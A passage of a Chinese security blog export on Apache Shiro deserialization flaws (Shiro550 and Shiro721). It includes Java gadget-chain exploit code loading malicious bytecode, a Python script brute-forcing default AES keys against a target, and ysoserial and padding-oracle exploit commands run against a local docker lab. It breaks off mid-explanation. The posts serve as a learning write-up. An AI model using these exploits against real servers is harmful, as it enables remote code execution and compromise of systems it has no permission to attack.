setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br><br>        <span class="hljs-comment">// 读取恶意字节码</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;evil.class&quot;</span>));<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">// 创建BeanComparator，使用AttrCompare作为内部比较器</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>        <span class="hljs-comment">// 创建PriorityQueue，但不立即添加元素</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);<br><br>        <span class="hljs-comment">// 直接通过反射设置队列内容，避免添加元素时触发比较</span><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// 序列化和反序列化</span><br>        serialize(queue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过反射设置对象的私有字段值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj 要设置字段的对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> fieldName 字段名称</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value 要设置的字段值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception 当操作失败时抛出</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将对象序列化到文件</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj 要序列化的对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException 当文件写入发生错误时抛出</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>        System.out.println(<span class="hljs-string">&quot;对象已序列化到 ser.bin 文件&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 从文件中反序列化对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> filename 要读取的文件名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 反序列化后的对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException 当文件读取发生错误时抛出</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassNotFoundException 当找不到对应类时抛出</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;反序列化成功完成&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;反序列化过程中捕获到异常: &quot;</span> + e.getClass().getName());<br>            System.out.println(<span class="hljs-string">&quot;这可能是成功执行恶意代码的标志&quot;</span>);<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            ois.close();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>操作跟上方类似，反序列化后进行加密即可</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2022.13.23@2x.png" alt="CleanShot 2025-08-08 at 22.13.23@2x"></p><h2 id="打CB存在的问题"><a href="#打CB存在的问题" class="headerlink" title="打CB存在的问题"></a>打CB存在的问题</h2><h3 id="ysoserial中CC版本问题"><a href="#ysoserial中CC版本问题" class="headerlink" title="ysoserial中CC版本问题"></a>ysoserial中CC版本问题</h3><p><img src="https://img1.plumstar.cn/upload5202110131617685.jpeg"></p><p>网上已经分析的很明白了，我就不多赘述了，commons-beanutils:commons-beanutils版本的问题，shiro是1.8.3，ysoserial是1.9.2，区别就在这里，上面没有问题是因为我是直接用的shiro里的版本一致，所以未出现这个问题，版本用一致即可，因为版本改的代码挺多的</p><h3 id="未找到ComparableComparator类"><a href="#未找到ComparableComparator类" class="headerlink" title="未找到ComparableComparator类"></a>未找到ComparableComparator类</h3><p>这个错误还是挺有意思的</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Unable <span class="hljs-keyword">to</span> load <span class="hljs-keyword">class</span> <span class="hljs-title class_">named</span> [org.apache.commons.collections.comparators.ComparableComparator]<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-09%20at%2015.54.22@2x.png" alt="CleanShot 2025-08-09 at 15.54.22@2x"></p><p>简单来说就是没找到 <code>org.apache.commons.collections.comparators.ComparableComparator</code> 类，从包名即可看出，这个类是来自于 <code>commons-collections</code>。</p><p><code>commons-beanutils</code> 本来依赖于 <code>commons-collections</code>，但是在 Shiro 中，它的 <code>commons-beanutils</code> 虽然包含了一部分 <code>commons-collections</code> 的类，但却不全。这也导致，正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><p>根据报错信息去找CB依赖中调用ComparableComparator类的地方，定位到<code>org.apache.commons.beanutils.BeanComparator#BeanComparator</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.09.23@2x.png" alt="CleanShot 2025-08-08 at 23.09.23@2x"></p><p>在 <code>BeanComparator</code> 类的构造函数处，当没有显式传入 <code>Comparator</code> 的情况下，则默认使用 <code>ComparableComparator</code> 。</p><p>既然此时没有 <code>ComparableComparator</code> ，需要找到一个类来替换，它满足下面这几个条件：</p><ul><li>实现 java.util.Comparator 接口</li><li>实现 java.io.Serializable 接口 Java、shiro 或 commons-beanutils 自带，且兼容性强</li></ul><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.28.57@2x.png" alt="CleanShot 2025-08-08 at 23.28.57@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.29.40@2x.png" alt="CleanShot 2025-08-08 at 23.29.40@2x"></p><p>同时满足这两个条件即可，随便找一个能用的就好了，例如com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare或者java.lang.String.CaseInsensitiveComparator均实现了这两个接口，那么改写一下exp即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-09%20at%2015.57.32@2x.png" alt="CleanShot 2025-08-09 at 15.57.32@2x"></p><p>上图的exp还是存在问题的，在添加元素到 PriorityQueue 时，使用了 AttrCompare 比较器，但它期望比较的是 Attr 类型的对象，而实际添加的是 Integer 类型的对象，导致类型转换异常的错误，这个就很好改了，修改办法参考我上面的exp</p><h1 id="0x05-漏洞探测"><a href="#0x05-漏洞探测" class="headerlink" title="0x05 漏洞探测"></a>0x05 漏洞探测</h1><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>在利用 shiro 漏洞时需要判断应用是否用到了 shiro。在请求包的 Cookie 中为 <code>rememberMe</code> 字段赋任意值，收到返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，说明目标有使用 Shiro 框架，可以进一步测试。</p><h2 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h2><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥，之前检测我们公司的时候就发现了这个问题。给了我们可以收集密钥的集合，或者对密钥进行爆破的机会</p><p>那么如何判断密钥是否正确呢？文章 <a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p><p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p><p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):<br>    aesCipher = AES.new(secretKey, AES.MODE_GCM)<br>    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)<br>    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):<br>    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span><br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> <br>    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># CBC加密</span><br>            encryptor = AES.new(base64.b64decode(key), mode, iv)<br>            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-comment"># GCM加密</span><br>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))<br>            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br> <br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>            <span class="hljs-keyword">return</span> key<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17572415.html">https://www.cnblogs.com/1vxyz/p/17572415.html</a></p><p><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p><p><a href="https://www.cnblogs.com/CVE-Lemon/p/17935937.html">https://www.cnblogs.com/CVE-Lemon/p/17935937.html</a></p><p><a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a></p>]]></content>
    
    
    <categories>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化Shiro篇02-Shiro721流程分析</title>
    <link href="/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化Shiro篇02-Shiro721流程分析"><a href="#Java反序列化Shiro篇02-Shiro721流程分析" class="headerlink" title="Java反序列化Shiro篇02-Shiro721流程分析"></a>Java反序列化Shiro篇02-Shiro721流程分析</h1><p>在 Shiro550 漏洞中，Cookie 所使用的 AES 加密密钥为硬编码，所以我们可以构造恶意序列化数据并使用固定的 AES 密钥进行正确加密恶意序列发送给服务端，进而达到攻击的目的。但在该漏洞公布后，Shiro 官方修复了这一漏洞，将AES密钥修改成了动态生成。也就是说，对于每一个 Cookie，都是使用不同的密钥进行加解密的。</p><p>Shiro-721漏洞的产生源自AES-128-CBC模式，它受CBC字节反转攻击和Padding Oracle Attack(侧信道攻击)的影响，导致可以从一个正常的rememberMe的值基础上,根据Padding Oracle Attack的原理,通过爆破构造出恶意的RememberMe，重新发送到服务器端进行解析并触发反序列化达到RCE的效果</p><p>个人感觉比较鸡肋，因为需要一个正确的账号，这个条件就比较苛刻了，如果你是一个普通账号登录来利用这个漏洞，可能连命令执行的权限都没有，部分情况是这样的，必须是有执行权限的账户例如root账户，具体要看开发怎么接入的Shiro，所以就比较鸡肋</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><p>可以直接用Drunkbaby佬的：<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Apache/Shiro/shiro721">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Apache/Shiro/shiro721</a></p><p>如果要自己搭建，也可以跟着Drunkbaby佬的教程搭建：<a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Java反序列化Shiro篇02-Shiro721环境搭建</a></p><p>IDEA导入文件然后配一下Tomcat环境就好了</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-13%20at%2020.10.52@2x.png" alt="CleanShot 2025-08-13 at 20.10.52@2x"></p><p>记得还需要把再把 <code>WEB-INF\lib</code> 加入 project structure 中</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2022.02.38@2x.png" alt="CleanShot 2025-08-14 at 22.02.38@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2008.18.06@2x.png" alt="CleanShot 2025-08-14 at 08.18.06@2x"></p><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><p>推荐使用docker，因为基本不会出问题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> clone https://github.com/inspiringz/Shiro-<span class="hljs-number">721</span>.git<br><span class="hljs-attribute">cd</span> Shiro-<span class="hljs-number">721</span>/Docker<br><span class="hljs-attribute">docker</span> build -t shiro-<span class="hljs-number">721</span> .<br><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.52.08@2x.png" alt="CleanShot 2025-08-14 at 19.52.08@2x"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p><p><code>Apache Shiro Padding Oracle Attack</code> 的漏洞利用必须满足如下前提条件：</p><ul><li>开启 rememberMe 功能；</li><li>rememberMe 值使用 AES-CBC 模式解密；</li><li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；</li><li>密文可控；</li></ul><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>相较于550的利用就相对较为麻烦了，因为涉及到<code>Padding Oracle Attack</code>相关的处理以及绕过，并且关于密钥的碰撞时间也相对较长。流程为</p><ol><li>登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。</li><li>重放恶意RememberMe cookie，以执行反序列化攻击。</li></ol><p>认证成功不会生成deleteMe的cookie字段，认证失败则会设置</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-13%20at%2022.18.02@2x.png" alt="CleanShot 2025-08-13 at 22.18.02@2x"></p><p>使用Java反序列化工具 ysoserial 生成 Payload:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /tmp/success&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span>注意是否有写入权限，我在用本地环境时用这个payload执行失败就是因为写入权限有问题<br></code></pre></td></tr></table></figure><p>利用<a href="https://github.com/3ndz/Shiro-721">GitHub的exp</a>来进行 Padding Oracle Attack，安装脚本不需要 <code>pip install paddingoracle</code>，直接将 GitHub 项目的 <code>paddingoracle.py</code> 放到同目录即可：</p><p>通过 Padding Oracle Attack 生成 Evil Rememberme cookie:</p><blockquote><p><strong>注意：</strong> 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（eg: ping 、 touch &#x2F;tmp&#x2F;success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python shiro_exp.py<br>Usage: shiro_exp.py &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;<br>python shiro_exp.py http://localhost:8080/account Q/YOn1G64exr7g6SFC+au3ah4JaRPgPDdsYEC8q9C3k0TS+kHjd/qMAsQ6qKfwY6Jf9z5J/dgNSPLzhQK9ahkP5gAg9vN9J+nz4B7J/ZXY94joflm6fzjUlsYPerPCd/6lU4XyIlTCtDlDgoNffG3oQZnYCepezfX59d8IhcRpCnmyS2Iv1DblL/9Eqzqs5VrIBPN1ScnJCjbF0W1zKeIh/+VTJWnrkynSuq5KoVNQZs4Wx/tP4VEIDMrmNFDRoZWBP+CQaB7OjFo/bfBpbj87lMmvI7EqQFOU0EqOG8C1sampBci2A5KcT3qzklx7G97ArERch0edE+WU445yr9hD/tpLqjC2tqBuEwfBs3hr94EuvPvtR6GmL1xPnbwQvvN7S0B8AFCzWp9yBnrS2zwVi0MVAYG/K2Fs9Bvltr2s89Em+xT9OSpI3qBB19kWqrtE3I14O7cY05Ge9E5nYKBoAG/ci5V4w5AaFKN45GAqFjNVsHoZrzYr6frSXIxpsB payload.bin<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.48.58@2x.png" alt="CleanShot 2025-08-14 at 19.48.58@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.50.33@2x.png" alt="CleanShot 2025-08-14 at 19.50.33@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.48.12@2x.png" alt="CleanShot 2025-08-14 at 19.48.12@2x"></p><p>也可以直接工具梭哈，工具就太多了</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Padding-Oracle-Attack-构造加密数据分析"><a href="#Padding-Oracle-Attack-构造加密数据分析" class="headerlink" title="Padding Oracle Attack 构造加密数据分析"></a>Padding Oracle Attack 构造加密数据分析</h2><p>密码这一块我就真的不知者慎言了，可以去网上找找相关资料，还是蛮详细的</p><p>网上讲的文章大多数都是讲的如何使用 Padding Oracle Attack 来获取明文。但是这种场景在 Apache Shiro Padding Oracle Attack 这个漏洞场景中就不适用了。在这个场景中，我们需要构造恶意加密数据，进行解密后反序列化。</p><p>此处内容参考自 <a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89</a></p><p>这里简单说下 Padding Oracle Attack 加密数据整体过程：</p><ol><li>选择一个明文 <code>P</code>，用来生成你想要的密文<code>C</code>；</li><li>使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；</li><li>生成一个随机数据块（<code>C[n]</code> 表示最后一个密文块）；</li><li>对于每一个明文块，从最后一块开始：<ol><li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块<code>C[n+1]</code>（如果是第一轮则是随机块）组合成的；</li><li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li><li>在计算完整个块之后，将它与明文块 <code>P[n]</code> 进行XOR一起创建 <code>C[n]</code>；</li><li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding 